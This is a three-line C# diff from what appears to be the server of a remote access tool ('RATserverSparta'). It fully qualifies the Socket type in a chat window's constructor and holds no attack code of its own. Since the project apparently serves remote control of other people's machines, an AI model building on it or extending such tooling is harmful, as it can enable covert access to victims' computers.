@@ -16,7 +16,7 @@ namespace RATserverSparta.Tools.Chat
     {
         private Client.Client ClientClassInstance;
         private Client.SocketSend Data;
-        public Chat(Client.Client ClientClassInstance, Socket ClientSocket)
+        public Chat(Client.Client ClientClassInstance, System.Net.Sockets.Socket ClientSocket)
         {
             InitializeComponent();
             this.ClientClassInstance = ClientClassInstance;
